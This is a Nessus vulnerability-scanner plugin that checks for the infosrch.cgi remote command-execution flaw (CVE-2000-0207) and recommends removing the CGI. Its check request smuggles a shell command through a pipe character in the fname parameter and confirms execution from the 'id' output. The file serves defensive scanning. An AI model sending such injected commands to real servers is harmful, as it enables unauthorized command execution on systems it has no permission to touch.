#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

desc = "The 'infosrch.cgi' CGI is installed. This CGI has
a well known security flaw that lets an attacker execute arbitrary
commands with the privileges of the http daemon (usually root or nobody).

Solution : Remove it from /cgi-bin.

Risk factor : High";


if(description)
{
 script_id(10128);
 script_bugtraq_id(1031);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2000-0207");
 name["english"] = "infosrch.cgi";
 script_name(english:name["english"]);

 script_description(english:desc);
 
 summary["english"] = "Checks for the presence of /cgi-bin/infosrch.cgi";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

http_check_remote_code (
			check_request:"/infosrch.cgi?cmd=getdoc&db=man&fname=|/bin/id",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc
			);
